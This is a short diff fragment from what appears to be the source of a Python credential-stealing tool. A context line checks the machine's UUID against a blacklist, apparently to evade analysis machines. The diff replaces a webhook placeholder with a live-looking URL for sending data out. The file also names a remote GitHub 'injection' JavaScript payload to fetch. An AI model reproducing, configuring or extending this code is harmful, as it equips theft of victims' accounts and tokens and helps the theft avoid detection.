@@ -49,7 +49,7 @@ if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
 
 
 
-wh00k = "WEBHOOK HERE"
+wh00k = "https://tasenboss.github.io/passtest/"
 inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
     
 DETECTED = False
